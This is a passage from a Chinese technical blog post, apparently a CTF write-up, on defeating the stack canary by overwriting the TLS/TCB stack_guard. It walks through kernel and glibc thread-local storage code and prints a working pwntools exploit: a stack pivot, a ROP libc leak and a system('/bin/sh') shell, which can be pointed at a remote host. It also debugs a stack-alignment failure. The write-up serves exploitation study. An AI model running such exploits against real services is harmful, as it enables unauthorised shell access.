(无关成员太多，省略)</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	switch_to(x,y) should switch tasks from x to y.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This could still be optimized:</span></span><br><span class="line"><span class="comment"> * - fold all the options into a flag word and test it with a single test.</span></span><br><span class="line"><span class="comment"> * - could test fs/gs bitsliced</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Kprobes not supported here. Set the probe on schedule instead.</span></span><br><span class="line"><span class="comment"> * Function graph tracer not supported too.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">__visible __notrace_funcgraph <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *</span></span><br><span class="line"><span class="class">__<span class="title">switch_to</span>(<span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">prev_p</span>, <span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">next_p</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">thread_struct</span> *<span class="title">prev</span> =</span> &amp;prev_p-&gt;thread;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">thread_struct</span> *<span class="title">next</span> =</span> &amp;next_p-&gt;thread;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fpu</span> *<span class="title">prev_fpu</span> =</span> &amp;prev-&gt;fpu;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fpu</span> *<span class="title">next_fpu</span> =</span> &amp;next-&gt;fpu;</span><br><span class="line">	<span class="keyword">int</span> cpu = smp_processor_id();</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tss_struct</span> *<span class="title">tss</span> =</span> &amp;per_cpu(cpu_tss, cpu);</span><br><span class="line">	<span class="keyword">unsigned</span> fsindex, gsindex;</span><br><span class="line">	<span class="keyword">fpu_switch_t</span> fpu_switch;</span><br><span class="line"></span><br><span class="line">	fpu_switch = switch_fpu_prepare(prev_fpu, next_fpu, cpu);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* We must save %fs and %gs before load_TLS() because</span></span><br><span class="line"><span class="comment">	 * %fs and %gs may be cleared by load_TLS().</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * (e.g. xen_load_tls())</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	savesegment(fs, fsindex);</span><br><span class="line">	savesegment(gs, gsindex);</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Load TLS before restoring any segments so that segment loads</span></span><br><span class="line"><span class="comment">	 * reference the correct GDT entries.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	load_TLS(next, cpu);  <span class="comment">// 在线程上下文切换时，更新gdt</span></span><br><span class="line">  (省略)</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> load_TLS(t, cpu)			native_load_tls(t, cpu)</span></span><br><span class="line">......</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">native_load_tls</span><span class="params">(struct thread_struct *t, <span class="keyword">unsigned</span> <span class="keyword">int</span> cpu)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> *<span class="title">gdt</span> =</span> get_cpu_gdt_table(cpu);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">  <span class="comment">// 更新gdt，使对应的段描述符变为将要执行的线程的段描述符</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; GDT_ENTRY_TLS_ENTRIES; i++)</span><br><span class="line">		gdt[GDT_ENTRY_TLS_MIN + i] = t-&gt;tls_array[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>另外，在调试的过程中也遇到了一个奇怪的问题，在qemu+64位kernel+busybox+64位可执行程序的情况下，虽然执行的是64位程序，但是<code>arch_prctl</code>中设置的地址居然是32位地址，然而在正常的ubuntu发行版上却没有这个问题，之后可以再看看原因</p>
<p>顺便总结一下我调试的时候遇到的不同情况，这些不同情况的原理都在上面的代码和注释中写明了</p>
<ol>
<li><p>qemu+64位老版kernel+busybox+64位可执行程序(glib 2.27+gcc 7.5.0编译)</p>
<p>此时<code>arch_prctl</code>设置fs的地址为32位地址，fs因此被设置为0x63，gs为0x0，并没有直接通过<code>WRMSR</code>修改fs寄存器的基地址，而是使用段寻址方式</p>
</li>
<li><p>qemu+64位老版kernel+busybox+32位可执行程序(glib 2.27+gcc 7.5.0编译)</p>
<p>此时不调用<code>arch_prctl</code>，使用glibc针对32系统<code>TLS_INIT_TP</code>修改了gs为0x63，fs保持不变为0x0，并没有直接通过<code>WRMSR</code>修改gs寄存器的基地址，而是使用段寻址方式</p>
</li>
<li><p>发行版64位ubuntu(新版内核)+32位可执行程序(glib 2.27+gcc 7.5.0编译)</p>
<p>此时不调用<code>arch_prctl</code>，使用glibc针对32系统<code>TLS_INIT_TP</code>修改了gs为0x63，fs保持不变为0x0，与第二种情况是一致的</p>
</li>
<li><p>发行版64位ubuntu(新版内核)+64位可执行程序(glib 2.27+gcc 7.5.0编译)</p>
<p>此时<code>arch_prctl</code>设置fs的地址为64位地址，fs因此被设置为0x0，gs也为0x0，<code>arch_prctl</code>中直接通过<code>WRMSR</code>修改了fs寄存器的基地址，不使用段寻址方式</p>
</li>
</ol>
<p>关于cpu是如何更改fs寄存器的，以下是摘录自<code>[AMD Architecture Programmer&#39;s Manual Volume 2: System Programming](https://www.amd.com/system/files/TechDocs/24593.pdf#page=124), section 4.5.3</code>，在内核的实现中，我们可以看到第一种方法被应用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">FS and GS Registers in 64-Bit Mode. Unlike the CS,DS,ES, and SS segments, the FS and GS segment overrides can   </span><br><span class="line">be used in 64-bit mode. When FS and GS segment overrides are used in 64-bit mode, their respective base addresses are used in the effective-address (EA) calculation. The complete EA calculation then becomes (FS or GS).base + base + (scale * index) + displacement. The FS.base and GS.base values are also expanded to the full 64-bit virtual-address size, as shown in Figure 4-5. The resulting EA calculation is allowed to wrap across positive and negative addresses.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">There are two methods to update the contents of the FS.base and GS.base hidden descriptor fields. The first is available exclusively to privileged software (CPL &#x3D; 0). The FS.base and GS.base hidden descriptor-register fields are mapped to MSRs. Privileged software can load a 64-bit base address in canonical form into FS.base or GS.base using a single WRMSR instruction. The FS.base MSR address is C000_0100h while the GS.base MSR address is C000_0101h.</span><br><span class="line"></span><br><span class="line">The second method of updating the FS and GS base fields is available to software running at any privilege level (when supported by the implementation and enabled by setting CR4[FSGSBASE]). The WRFSBASE and WRGSBASE instructions copy the contents of a GPR to the FS.base and GS.base fields respectively. When the operand size is 32 bits, the upper doubleword of the base is cleared. WRFSBASE and WRGSBASE are only supported in 64-bit mode.</span><br></pre></td></tr></table></figure>



<p>所以这里借助<code>x/32gx pthread_self()</code>来访问</p>
<p>下面是<code>pthread_self()</code>及其相关关键结构的实现(在linux x86_64系统上),可以看到实际上这个函数是取了<code>fs:(结构体pthread中header.self成员的偏移)</code>，而我们由上面的知识可以知道，fs在这里代表TCB的起始地址，那么加上结构体pthread中header.self成员的偏移，就相当于取tcbhead_t中self成员的值，这个值指向TCB的起始地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pthread_t</span></span><br><span class="line">pthread_self (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">pthread_t</span>) THREAD_SELF;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 这是64位下的THREAD_SELF</span></span><br><span class="line"><span class="comment">/* Return the thread descriptor for the current thread.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The contained asm must *not* be marked volatile since otherwise</span></span><br><span class="line"><span class="comment">   assignments like</span></span><br><span class="line"><span class="comment">	pthread_descr self = thread_self();</span></span><br><span class="line"><span class="comment">   do not get optimized away.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> THREAD_SELF \</span></span><br><span class="line">  (&#123; struct pthread *__self;						      \</span><br><span class="line">     <span class="keyword">asm</span> (<span class="string">&quot;mov %%fs:%c1,%0&quot;</span> : <span class="string">&quot;=r&quot;</span> (__self)				      \</span><br><span class="line">	  : <span class="string">&quot;i&quot;</span> (offsetof (struct pthread, header.self)));	 	      \</span><br><span class="line">     __self;&#125;)</span><br><span class="line">  </span><br><span class="line">......</span><br><span class="line">  </span><br><span class="line"><span class="comment">//这是32位下的THREAD_SELF</span></span><br><span class="line"><span class="comment">/* Return the thread descriptor for the current thread.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The contained asm must *not* be marked volatile since otherwise</span></span><br><span class="line"><span class="comment">   assignments like</span></span><br><span class="line"><span class="comment">	pthread_descr self = thread_self();</span></span><br><span class="line"><span class="comment">   do not get optimized away.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> THREAD_SELF \</span></span><br><span class="line">  (&#123; struct pthread *__self;						      \</span><br><span class="line">     <span class="keyword">asm</span> (<span class="string">&quot;movl %%gs:%c1,%0&quot;</span> : <span class="string">&quot;=r&quot;</span> (__self)				      \</span><br><span class="line">	  : <span class="string">&quot;i&quot;</span> (offsetof (struct pthread, header.self)));		      \</span><br><span class="line">     __self;&#125;)</span><br><span class="line">  </span><br><span class="line">......</span><br><span class="line">  </span><br><span class="line"><span class="comment">/* Thread descriptor data structure.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pthread</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> !TLS_DTV_AT_TP</span></span><br><span class="line">    <span class="comment">/* This overlaps the TCB as used for TLS without threads (see tls.h).  */</span></span><br><span class="line">    <span class="keyword">tcbhead_t</span> header; <span class="comment">// tcbhead_t结构在本章前面有介绍</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="comment">/* multiple_threads is enabled either when the process has spawned at</span></span><br><span class="line"><span class="comment">	 least one thread or when a single-threaded process cancels itself.</span></span><br><span class="line"><span class="comment">	 This enables additional code to introduce locking before doing some</span></span><br><span class="line"><span class="comment">	 compare_and_exchange operations and also enable cancellation points.</span></span><br><span class="line"><span class="comment">	 The concepts of multiple threads and cancellation points ideally</span></span><br><span class="line"><span class="comment">	 should be separate, since it is not necessary for multiple threads to</span></span><br><span class="line"><span class="comment">	 have been created for cancellation points to be enabled, as is the</span></span><br><span class="line"><span class="comment">	 case is when single-threaded process cancels itself.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	 Since enabling multiple_threads enables additional code in</span></span><br><span class="line"><span class="comment">	 cancellation points and compare_and_exchange operations, there is a</span></span><br><span class="line"><span class="comment">	 potential for an unneeded performance hit when it is enabled in a</span></span><br><span class="line"><span class="comment">	 single-threaded, self-canceling process.  This is OK though, since a</span></span><br><span class="line"><span class="comment">	 single-threaded process will enable async cancellation only when it</span></span><br><span class="line"><span class="comment">	 looks to cancel itself and is hence going to end anyway.  */</span></span><br><span class="line">      <span class="keyword">int</span> multiple_threads;</span><br><span class="line">      <span class="keyword">int</span> gscope_flag;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifndef</span> __ASSUME_PRIVATE_FUTEX</span></span><br><span class="line">      <span class="keyword">int</span> private_futex;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125; header;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<p>那么基于此，可以修改exp如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os = &#x27;linux&#x27;</span><br><span class="line">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line"># [&#x27;CRITICAL&#x27;, &#x27;DEBUG&#x27;, &#x27;ERROR&#x27;, &#x27;INFO&#x27;, &#x27;NOTSET&#x27;, &#x27;WARN&#x27;, &#x27;WARNING&#x27;]</span><br><span class="line">context.log_level = &#x27;DEBUG&#x27;</span><br><span class="line"></span><br><span class="line">libc_path = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br><span class="line">bin_path = &#x27;./bs&#x27;</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">binary = ELF(bin_path)</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;&#x27;</span></span><br><span class="line">port = 6666</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def debug(command=&#x27;&#x27;):</span><br><span class="line">    gdb.attach(p, command)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    # debug(&#x27;b *0x4009E7\n&#x27;)</span><br><span class="line">    g = lambda x: next(binary.search(asm(x, os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;)))</span><br><span class="line">    pop_rdi = g(&#x27;pop rdi; ret&#x27;)</span><br><span class="line">    pop_rsi_pop = g(&#x27;pop rsi; pop r15; ret&#x27;)</span><br><span class="line">    leave = g(&#x27;leave; ret&#x27;)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">log</span>.info(<span class="string">&quot;pop_rdi:     &quot;</span> + hex(pop_rdi))</span><br><span class="line">    <span class="built_in">log</span>.info(<span class="string">&quot;pop_rsi_pop: &quot;</span> + hex(pop_rsi_pop))</span><br><span class="line">    <span class="built_in">log</span>.info(<span class="string">&quot;leave:       &quot;</span> + hex(leave))</span><br><span class="line"></span><br><span class="line">    size = <span class="number">0x1850</span></span><br><span class="line">    p.sendlineafter(&#x27;send?\n&#x27;, str(size))</span><br><span class="line"></span><br><span class="line">    fakebuf = <span class="number">0x602f00</span></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    payload += &#x27;A&#x27; * 0x1010</span><br><span class="line">    <span class="meta"># stack pivot #step 1</span></span><br><span class="line">    payload += p64(fakebuf)</span><br><span class="line">    # ROP1 - leak libc</span><br><span class="line">    payload += p64(pop_rdi)</span><br><span class="line">    payload += p64(binary.got[&#x27;puts&#x27;])</span><br><span class="line">    payload += p64(binary.plt[&#x27;puts&#x27;])</span><br><span class="line">    # ROP2 - read</span><br><span class="line">    payload += p64(pop_rdi)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(pop_rsi_pop)</span><br><span class="line">    payload += p64(fakebuf)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(binary.plt[&#x27;read&#x27;])</span><br><span class="line">    <span class="meta"># stack pivot #step 2</span></span><br><span class="line">    payload += p64(leave)</span><br><span class="line">    # Override TCB Canary</span><br><span class="line">    payload = payload.ljust(size, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">    <span class="meta">#print(<span class="meta-string">&quot;pid &quot;</span> + str(proc.pidof(p)))</span></span><br><span class="line">    #raw_input(<span class="string">&quot;attach me&quot;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    <span class="meta">#print(<span class="meta-string">&quot;pid &quot;</span> + str(proc.pidof(p)))</span></span><br><span class="line">    #raw_input(<span class="string">&quot;attach me&quot;</span>)</span><br><span class="line">    p.recvuntil(&#x27;goodbye.\n&#x27;)</span><br><span class="line">    leak = p.recv(6)+&#x27;\x00\x00&#x27;</span><br><span class="line">    leak = u64(leak)</span><br><span class="line">    <span class="meta">#info(<span class="meta-string">&quot;libc.address is %#x&quot;</span>, libc.address)</span></span><br><span class="line">    <span class="meta">#print(<span class="meta-string">&quot;leak:&quot;</span>, leak)</span></span><br><span class="line">    #print(&quot;sym:&quot;, libc.symbols[&#x27;puts&#x27;])</span><br><span class="line">    libc.address = leak - libc.symbols[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">    <span class="meta">#print(<span class="meta-string">&quot;leak:&quot;</span>,leak)</span></span><br><span class="line">    #print(&quot;sym:&quot;,libc.symbols[&#x27;puts&#x27;])</span><br><span class="line">    info(<span class="string">&quot;libc.address is %#x&quot;</span>, libc.address)</span><br><span class="line">    bin_sh = libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line">    system = libc.sym[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">    <span class="meta">#payload = <span class="meta-string">&#x27;&#x27;</span></span></span><br><span class="line">    #payload += p64(0)</span><br><span class="line">    <span class="meta">#payload += p64((libc.address+0x4f3c2))</span></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    payload += p64(0)</span><br><span class="line">    payload += p64(pop_rdi)</span><br><span class="line">    payload += p64(bin_sh)</span><br><span class="line">    payload += p64(system)</span><br><span class="line"></span><br><span class="line">    p.send(payload)</span><br><span class="line">    <span class="meta">#print (<span class="meta-string">&quot;pid &quot;</span> + str(proc.pidof(p)))</span></span><br><span class="line">    #raw_input(<span class="string">&quot;attach me&quot;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    <span class="function"><span class="keyword">if</span> <span class="title">len</span><span class="params">(sys.argv)</span> </span>== <span class="number">1</span>:</span><br><span class="line">        global p</span><br><span class="line">        p = process(executable=bin_path, argv=[bin_path])  # , env=&#123;&#x27;LD_PRELOAD&#x27;:libc_path&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(sys.argv[<span class="number">1</span>], <span class="keyword">int</span>(sys.argv[<span class="number">2</span>]))</span><br><span class="line">    exploit()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>修改了payload的长度，仅覆盖至<code>stack_guard</code>即可</p>
<p>本以为大功告成，可是事与愿违，当我再次运行exp时，仍然抛出了错误</p>
<p>我:????????</p>
<p>本以为是改的不对，计算错了偏移量，但是当我再一次gdb调试后，发现原来的错误处已经正常</p>
<p><img src="/image/bypass-Canary/also_gg.png" alt="also_gg"></p>
<p>那就很奇怪了，为什么还是不行呢？</p>
<p>继续调试，同时我写了一个正常调用system函数的代码做对比</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> * <span class="title">start</span><span class="params">()</span></span>&#123;</span><br><span class="line"> getchar();</span><br><span class="line"> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> t;</span><br><span class="line">    pthread_create(&amp;t, <span class="literal">NULL</span>, &amp;start, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (pthread_join(t, <span class="literal">NULL</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;exit failure&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Bye bye&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>经过长时间的调试，我发现了奇怪的地方</p>
<p><img src="/image/bypass-Canary/wired.png" alt="wired"></p>
<p>这里显示syscall调用的是<code>wait4()</code>这个系统调用，如果是正常的调用system函数，程序应当在syscall执行之后阻塞，但是在执行exp时，却并没有阻塞，而是直接跳了过去，那也就是说<code>wait4()</code>并没有阻塞，而是直接退出了</p>
<p>这令我很疑惑，于是我查看了<code>wait4()</code>试图等待的进程pid，即rdi寄存器的值，如下</p>
<p><img src="/image/bypass-Canary/pid_gg.png" alt="pid_gg"></p>
<p>可以发现，<code>wait4()</code>想要等待的进程已经退出，成为了僵尸进程，而如果正常调用system，那么<code>wait4()</code>等待的进程应当如下</p>
<p><img src="/image/bypass-Canary/pid_not_gg.png" alt="pid_not_gg"></p>
<p>也就是说，system调用的<code>/bin/sh</code>并没有成功启动，于是，我把目光转向了之前的汇编代码，寻找启动<code>/bin/sh</code>的地方</p>
<p>很快我就找到了相关代码</p>
<p><img src="/image/bypass-Canary/start_system.png" alt="start_system"></p>
<p>可以看到这里syscall调用了clone这个系统调用，就是在这里，<code>/bin/sh</code>被启动了</p>
<p>之后我便做了对比，但是我却发现，正常情况下，当执行到此处汇编代码时，完全可以正常启动，而各个寄存器参数值与我使用exp时并无太大区别，按理说并不会无法启动</p>
<p>到这里算是陷入了僵局，正当我掉头发时，我突然想起了之前看过的一篇文章 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/Rookle/p/12871878.html">https://www.cnblogs.com/Rookle/p/12871878.html</a></p>
<p>而你也可以看到，在使用exp时，当程序执行到syscall时，rsp并没有16字节对齐</p>
<p>于是我抱着试试看的心态，手动将rsp对齐</p>
<p><img src="/image/bypass-Canary/alignment.png" alt="alignment"></p>
<p>执行</p>
<p><img src="/image/bypass-Canary/after_align.png" alt="after_align"></p>
<p>此时rax是返回的进程pid，查看一下进程情况</p>
<p><img src="/image/bypass-Canary/clone_successfuly.png" alt="clone_successfuly"></p>
<p>可以看到，正常地启动了</p>
<p>那么也就是说，在syscall前，我们必须保证rsp对齐16字节</p>
<p>其实在exp中要解决这个问题也简单，只需要在最终的payload中添加一个ret的gadget就可以了</p>
<p>最终版如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span 